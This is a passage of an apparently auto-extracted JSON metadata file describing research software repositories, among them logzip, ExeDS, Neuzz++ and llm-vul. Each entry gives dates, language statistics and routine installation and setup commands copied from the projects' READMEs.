                    "value": "You can reproduce the experiments with the provided `.travis.yml` build configuration. If you want to execute the experiments locally, first follow the [Applitools Selenium/Java tutorial](https://applitools.com/tutorials/selenium-java.html) to set up your environment. In addition, make sure to install [Firefox](https://mozilla.org/en/firefox/) and [GeckoDriver](https://firefox-source-docs.mozilla.org/testing/geckodriver/). \nPlease note that we used customized (and meanwhile possibly outdated) versions of [recheck](https://github.com/beatngu13/recheck/), [recheck-web](https://github.com/beatngu13/recheck-web/) and [recheck.cli](https://github.com/beatngu13/recheck.cli/). In all projects, you will find a branch named `visual-testing` that you can build from source:\n```\nmvn install\n```\n \nFor Applitools, you have to create an account at https://applitools.com/ and set the environment variable `APPLITOOLS_API_KEY` to your personal API key. \nThen, clone this repo and run the evaluation:\n```\nmvn test --activate-profiles eval\n```\n \n* While it possible to [declare a specific Firefox version](https://docs.travis-ci.com/user/firefox#selecting-a-firefox-version/) on Travis CI, one cannot [select a Chrome version](https://docs.travis-ci.com/user/chrome/). This means that reproducing the experiments might lead to different results if the Travis CI environment changes.\n* Also if you are executing the experiments locally, the results may vary from the ones in the paper due platform, browser or other environment differences.\n* While we downloaded the aforementioned web pages to minimize external influences, some pages still obtain assets via the Internet. This might also be a reason for different results.\n* We do _not_ execute the actual evaluation on Travis CI per default. In order to do so, you can activate the corresponding Maven profile via `--activate-profiles eval`. You have to adapt `ci/script.sh` accordingly if you want to do this permanently.  \n \n",
                    "original_header": "Reproduce Experiments"
                },
                "confidence": 0.9997158652107856,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/beatngu13/visual-testing/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-03-21T10:23:19Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-08-28T12:10:22Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 11787319
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 1659489
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 91514
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 14406
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1318
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "815": {
        "filename": "logpai_logzip_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/logpai/logzip",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Logzip can be directly execute through source code. \n\n1. Download and install python3 [here](https://www.python.org/downloads/).\n\n2. Install Pandas.\n\n   ```$ pip3 install pandas```\n\n3. Clone logzip.\n\n   ``` $ clone https://github.com/logpai/logzip.git``` \n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "logzip"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/logpai/logzip/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-09-15T12:10:22Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-02T19:16:50Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 25610
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "816": {
        "filename": "zcyyc_AnoFusion_2024-10-04.json",
        "code_repository": "No code repository found.",
        "installation_instructions": "No installation instructions found.",
        "date_created": "No date_created found.",
        "date_updated": "No date_updated found.",
        "programming_languages": "No programming languages found."
    },
    "817": {
        "filename": "Jun-jie-Huang_ExeDS_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Jun-jie-Huang/ExeDS",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Download the data from xxx as described in Section xxx\n",
                    "type": "Text_excerpt",
                    "original_header": "1. Data Preparation",
                    "parent_header": [
                        "ExeDS",
                        "2. Rerun baseline mothods"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/Jun-jie-Huang/ExeDS/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Before running scripts to evaluate, first set up the environment with the following commands:\n```\ncd ./evaluation\nconda create -n EvalExeDS python==3.7\nconda activate EvalExeDS\npip install -r requirements_execution.txt\npip install tree_sitter==0.19.0\npip install rouge\n```\n \n",
                    "original_header": "1.0 Evaluation Environment"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Jun-jie-Huang/ExeDS/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "(1) Create environment for testing, controlled by  `--do_create_notebook`. \nYou can also separately run the three steps. Here we give the whole scripts for evaluation as follows. It approximately takes 4 hours to run.\n```\nexport SAVE_RESULT=\"dir-to-save-generation-file\"\npython evaluate_execution.py \\\n  --do_create_notebook \\\n  --do_run \\\n  --do_evaluate \\\n  --split test \\\n  --path_generation ${SAVE_RESULT}/split_generation_results.json \\\n  --path_dataset ../dataset/exeds_test.json \\\n  --data_dir ../dataset/ExeDS_notebooks \\\n  --path_save_notebooks ${SAVE_RESULT}/testbed_notebooks \\\n  2>&1 |tee ../logs/evaluate_execution.log\n```\n \n",
                    "original_header": "1.3 Evaluate"
                },
                "confidence": 0.9519978204353385,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Jun-jie-Huang/ExeDS/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Use the following scripts to preprocess data for training/validation/test sets.\n```\ncd ./preprocess\npython preprocess.py \\\n            --split train \\\n            --file_name exeds_train.json \\\n            --do_fairseq_tokenization \\\n            --do_gptneo \\\n            --token_type token \\\n            --context_range 3 \\\n            --max_code_cell_tokens 200 \\\n            --max_md_cell_tokens 200 \\\n            --max_ctx_cell_tokens 900\npython preprocess.py \\\n            --split dev \\\n            --file_name exeds_dev.json \\\n            --do_fairseq_tokenization \\\n            --do_gptneo \\\n            --token_type token \\\n            --context_range 3 \\\n            --max_code_cell_tokens 200 \\\n            --max_md_cell_tokens 200 \\\n            --max_ctx_cell_tokens 900\npython preprocess.py \\\n            --split test \\\n            --file_name exeds_test.json \\\n            --do_fairseq_tokenization \\\n            --do_gptneo \\\n            --token_type token \\\n            --context_range 3 \\\n            --max_code_cell_tokens 200 \\\n            --max_md_cell_tokens 200 \\\n            --max_ctx_cell_tokens 900\n```\n \n",
                    "original_header": "2. Preprocessing"
                },
                "confidence": 0.9998022847062412,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Jun-jie-Huang/ExeDS/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```\npip install torch==1.6\npip install tensorboard\npip install attrs==19.1.0\npip install transformers==3.3\npip install tree_sitter==0.19.0\npip install tokenizers\npip install sentencepiece\npip install scikit-learn\npip install altair\npip install tqdm\npip install rouge\npip install fuzzywuzzy\n```\n \n",
                    "original_header": "1 Environment:"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Jun-jie-Huang/ExeDS/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Use the following command:\n```\nbash traineval_gpt.sh ../ microsoft/CodeGPT-small-py prepro_addTab-df_madeup_token_range3_lineLen1-25_c200m200a900 30 16\n```\nThe parameters in the above command denote:\n```\n$1: path to the root dir\n$2: checkpoint used to intialize the weights, you can use \"microsoft/CodeGPT-small-py-adaptedGPT2\" or \"microsoft/CodeGPT-small-py\"\n$3: path to the preprocessed data\n$4: epochs (default 30)\n$5: Number of GPUs (8 or 16)\n```\n \n",
                    "original_header": "3 Training"
                },
                "confidence": 0.9993471588768301,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Jun-jie-Huang/ExeDS/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```\ncd codegpt/\ncp ../evaluation/* ./ -r\nbash evaluate_execution.sh ../ microsoft/CodeGPT-small-py prepro_addTab-df_madeup_token_range3_lineLen1-25_c200m200a900 30 16\n``` \n",
                    "original_header": "4 Test execution"
                },
                "confidence": 0.996146940680295,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Jun-jie-Huang/ExeDS/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Pull docker from Docker Hub: `ranpox/pytorch:1.10.0-cuda10.2-apex`. Then\n```\ncd gptneo/ \npip install -r requirements.txt\npip install tree_sitter==0.19.0\npip install rouge\n```\n \n",
                    "original_header": "4.1 Environment:"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Jun-jie-Huang/ExeDS/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Use the following command:\n```\nbash traineval_neo.sh ../ EleutherAI/gpt-neo-125M prepro_addTab-df_madeup_token_range3_lineLen1-25_c200m200a900 10 16\n```\nThe parameters in the above command denote:\n```\n$1: path to the root dir\n$2: checkpoint used to intialize the weights, you can use \"EleutherAI/gpt-neo-125M\",  \"EleutherAI/gpt-neo-1.3B\", or \"EleutherAI/gpt-neo-2.7B\"\n$3: path to the preprocessed data\n$4: epochs (default 10)\n$5: Number of GPUs (8 or 16)\n```\n \n",
                    "original_header": "4.3 Training"
                },
                "confidence": 0.9996442789513555,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Jun-jie-Huang/ExeDS/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```\nbash only_predict_neo.sh ../ EleutherAI/gpt-neo-125M prepro_addTab-df_madeup_token_range3_lineLen1-25_c200m200a900 10 16\n``` \n",
                    "original_header": "4.4 Generate code for testset"
                },
                "confidence": 0.980622617933746,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Jun-jie-Huang/ExeDS/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```\ncd gpt_neo/\ncp ../evaluation/* ./ -r\nbash evaluate_execution.sh ../ EleutherAI/gpt-neo-125M prepro_addTab-df_madeup_token_range3_lineLen1-25_c200m200a900 10 16\n``` \n",
                    "original_header": "4.5 Test execution"
                },
                "confidence": 0.9978677198197686,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Jun-jie-Huang/ExeDS/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-03-14T09:02:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-02T21:48:48Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 1130040
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 532249
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 424794
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 276804
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jinja",
                    "name": "Jinja",
                    "type": "Programming_language",
                    "size": 82734
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 18444
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 8870
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 7773
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Smarty",
                    "name": "Smarty",
                    "type": "Programming_language",
                    "size": 257
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "818": {
        "filename": "cbr-paper_CBR_Experimental_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/cbr-paper/CBR_Experimental",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2019-10-10T08:24:33Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2019-10-14T13:36:49Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 10584020
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 200876
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 92769
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "AspectJ",
                    "name": "AspectJ",
                    "type": "Programming_language",
                    "size": 15771
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 7120
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "819": {
        "filename": "boschresearch_neuzzplusplus_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/boschresearch/neuzzplusplus",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Neuzz++ is implemented as a custom mutator for AFL++, so it requires this fuzzer to be installed.\nFor reproducing experimental results from the paper, we recommend using the AFL++ version specified by the commit hash below.\nWe provide two alternative installation options:\n* Either clone and compile AFL++ from source in the folder of your choice:\n\n      git clone https://github.com/AFLplusplus/AFLplusplus\n      cd AFLplusplus/\n      git checkout 9e2a94532b7fd5191de905a8464176114ee7d258\n      make\n\n* Or install from Ubuntu repositories:\n\n      sudo apt install afl++\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing AFL++",
                    "parent_header": [
                        "Neuzz++ - Neural program smoothing for fuzzing in AFL++",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/boschresearch/neuzzplusplus/main/README.md"
            },
            {
                "result": {
                    "value": "This project uses `python>=3.8` and [`poetry`](https://python-poetry.org/) for managing the Python environment.\nInstall `poetry` system-wide or in an empty virtual environment (e.g., created via `virtualenv` or `conda`).\nThen run\n\n    poetry install --without dev\n\nto install the project dependencies.\nNote that Neuzz++ and MLFuzz have the same Pythhon dependencies; you only need to create one virtual environment for both of them.\nUse\n\n    poetry shell\n\nto activate the environment.\n",
                    "type": "Text_excerpt",
                    "original_header": "Install Python dependencies",
                    "parent_header": [
                        "Neuzz++ - Neural program smoothing for fuzzing in AFL++",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/boschresearch/neuzzplusplus/main/README.md"
            },
            {
                "result": {
                    "value": "In the cloned `NEUZZplusplus` folder, run:\n\n    make -C ./aflpp-plugins/\n",
                    "type": "Text_excerpt",
                    "original_header": "Build Neuzz++ custom mutator",
                    "parent_header": [
                        "Neuzz++ - Neural program smoothing for fuzzing in AFL++",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/boschresearch/neuzzplusplus/main/README.md"
            },
            {
                "result": {
                    "value": "Finally, export the `AFL_PATH` and `NEUZZPP_PATH` pointing to the cloned repos:\n\n    export AFL_PATH=/path/to/AFLplusplus/\n    export NEUZZPP_PATH=/path/to/NEUZZplusplus/\n\nYou are now ready to use Neuzz++.\n",
                    "type": "Text_excerpt",
                    "original_header": "Set environment variables",
                    "parent_header": [
                        "Neuzz++ - Neural program smoothing for fuzzing in AFL++",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/boschresearch/neuzzplusplus/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Neuzz++ follows a standard Python package structure. \n    NEUZZplusplus/\n    \u251c\u2500\u2500 aflpp-plugins/          # Neuzz++ custom mutator for AFL++ linking to Python code for ML \n    \u251c\u2500\u2500 docs/                   # Sphinx documentation sources\n    \u251c\u2500\u2500 neuzzpp/                # Python package with reusable ML logic\n    \u251c\u2500\u2500 notebooks/              # Jupyter notebooks reproducing mutations effectiveness analysis\n    \u251c\u2500\u2500 scripts/                # Scripts folder with Neuzz++ ML code used by AFL++ custom mutator\n    \u251c\u2500\u2500 LICENSE                 # License file\n    \u251c\u2500\u2500 poetry.lock             # Project requirements in Poetry format\n    \u251c\u2500\u2500 pyproject.toml          # Standard Python package description for pip\n    \u2514\u2500\u2500 README.md               # The present README file\n \n",
                    "original_header": "Project structure"
                },
                "confidence": 0.970443381612886,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/boschresearch/neuzzplusplus/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-08-16T12:16:21Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-01T06:54:49Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 66306
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 30598
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 17593
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 400
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "820": {
        "filename": "SMAT-Lab_SnifferDog_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/SMAT-Lab/SnifferDog",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "1. dataset/all.selected.notebooks  6004 notebook project considered in this project. This is a csv file where each of lines has the detailed information such as its GitHub link, Python version, selected notebook and environment file.\n2. dataset/snifferdog.executable.notebooks  507 notebook project are executed by  SnifferDog. This is a csv file where each of lines has the detailed information such as its GitHub link, Python version, selected notebook and environment file.\n3. dataset/all.github.urls  all 100k notebook projects   \n",
                    "original_header": "Dataset"
                },
                "confidence": 0.9051622536966165,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/SMAT-Lab/SnifferDog/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-02-09T22:47:03Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-24T12:24:10Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 70818
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "821": {
        "filename": "ChenKen9869_DCA-IOT-system_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ChenKen9869/DCA-IOT-system",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "1. Clone this project\n\n```shell\ngit clone https://github.com/ChenKen9869/DCA-IOT-system.git\n```\n\n2. Build it locally\n\n```shell\ncd DCA-IOT-system\ngo build -o ./build/dca\n```\n\n3. Config the project at /config/application.yaml\n\n```shell\nvim ./config/application.yaml\n```\n\n**Deploy this project in server**\n\n1. Use scp command to send the executable file to the server.\n\n   ```shell\n   scp ./build/dca another-server-directory\n   ```\n\n2. Use [go-swagger](#https://github.com/go-swagger/go-swagger) to generate the swagger api file. And also use scp command to send swagger files to the server.\n\n   ```shell\n   swag init\n   scp -r ./docs another-server-directory\n   ```\n\n3. Use scp command to send the config file to the server\n\n   ```shell\n   scp ./config/application.yaml another-server-directory/config/\n   ```\n\n4. Use scp command to send the example device python file to the server for testing rules\n\n   ```shell\n   scp ./scripts/example_device.py another-server-directory/scripts/\n   ```\n\n5.  Start the service\n\n   ```shell\n   ./dca\n   ```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "Quick Start"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/ChenKen9869/DCA-IOT-system/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-07-16T08:33:42Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-10-10T01:29:01Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Go",
                    "name": "Go",
                    "type": "Programming_language",
                    "size": 206338
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 3745
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 127
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "822": {
        "filename": "fewshotcdcs_CDCS_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/fewshotcdcs/CDCS",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "CDCS pre-trained on Python and Java data from CodeBERT(https://github.com/microsoft/CodeBERT).\nYou can use the following command to download the preprocessed training and validation dataset: \n```\ngdown https://drive.google.com/uc?id=1xgSR34XO8xXZg4cZScDYj2eGerBE9iGo  \n```\n \n",
                    "original_header": "Pre-training &amp; Meta learning"
                },
                "confidence": 0.9999997375783269,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/fewshotcdcs/CDCS/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "CDCS fine-tuned on Solidty(https://zenodo.org/record/4587089#.YEog9-gzYuV) and SQL(https://github.com/taoyds/spider) data.  \n",
                    "original_header": "Fine-tuning"
                },
                "confidence": 0.9992010803598039,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/fewshotcdcs/CDCS/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\nFor example, if you want to run the meta learning, you can simple run:\n```\npython maml.py \\\n--model_type roberta \\\n--task_name codesearch \\\n--do_meta_train \\\n--do_eval \\\n--eval_all_checkpoints \\\n--train_file train.txt \\\n--dev_file valid.txt \\\n--max_seq_length 256\\\n--per_gpu_train_batch_size 32 \\\n--per_gpu_eval_batch_size 32 \\\n--learning_rate 1e-5 \\\n--num_train_epochs 2 \\\n--gradient_accumulation_steps 1 \\\n--overwrite_output_dir \\\n--data_dir ../data/codesearch/train_valid/$lang \\\n--output_dir ./models/$lang  \\\n--model_name_or_path $pretrained_model\n``` \nIf you want to run fine-tuning, you can replace the `--do_meta_train` with `--do_train`\n \n",
                    "original_header": "Script"
                },
                "confidence": 0.9976627783927154,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/fewshotcdcs/CDCS/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "For quick replication, we have released our pre-trained and meta-learned checkpoints at\nhttps://github.com/fewshotcdcs/CDCS/releases/tag/v1.0.0\n \n",
                    "original_header": "Checkpoints"
                },
                "confidence": 0.9995610743886901,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/fewshotcdcs/CDCS/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-09-04T01:44:48Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-31T06:26:13Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 60195
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "823": {
        "filename": "software-bugs_change-clone_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/software-bugs/change-clone",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-01-25T10:45:16Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-01-04T14:11:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "824": {
        "filename": "lin-tan_llm-vul_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/lin-tan/llm-vul",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "This repository contains the artifact of paper \"How Effective are Neural Networks for Fixing Security Vulnerabilities?\" published in ISSTA 2023 by Yi Wu, Nan Jiang, Hung Viet Pham, Thibaud Lutellier, Jordan Davis, Lin Tan, Petr Babkin, and Sameena Shah. \n\n",
                    "type": "Text_excerpt",
                    "original_header": "ISSTA 2023 paper How Effective are Neural Networks for Fixing Security Vulnerabilities?"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/lin-tan/llm-vul/main/README.md"
            },
            {
                "result": {
                    "value": "Please modifying the following paths in [`scripts/util.py`](scripts/util.py) to your own path.\n\n```python\n\nVUL4J_DIR = \"/path/to/Vul4J_projects/\" # the absolute path to the folder that will contain all the Vul4J projects\n\nVJBENCH_DIR = \"/path/to/VJBench_projects/\" # the absolute path to the folder that will contain all the VJBench projects\n\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Setup",
                    "parent_header": [
                        "ISSTA 2023 paper How Effective are Neural Networks for Fixing Security Vulnerabilities?"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/lin-tan/llm-vul/main/README.md"
            },
            {
                "result": {
                    "value": "To reproduce the results for Vul4J, please refer to the [Vul4J repository](https://github.com/tuhh-softsec/vul4j) for how to set up.\nA script to help checkout Vul4J vulnerabilities is available at [`./scripts/VUL4J/vul4j_projects.py`](scripts/VUL4J/vul4j_projects.py). These 35 Vul4J vulnerabilities are used in our study: VUL4J-1, 3, 4, 5, 6, 7, 8, 10, 12, 18, 19, 20, 22, 23, 25, 26, 30, 39, 40, 41, 43, 44, 46, 47, 50, 53, 55, 57, 59, 61, 64, 65, 66, 73, 74.\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Vul4J",
                    "parent_header": [
                        "ISSTA 2023 paper How Effective are Neural Networks for Fixing Security Vulnerabilities?"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/lin-tan/llm-vul/main/README.md"
            },
            {
                "result": {
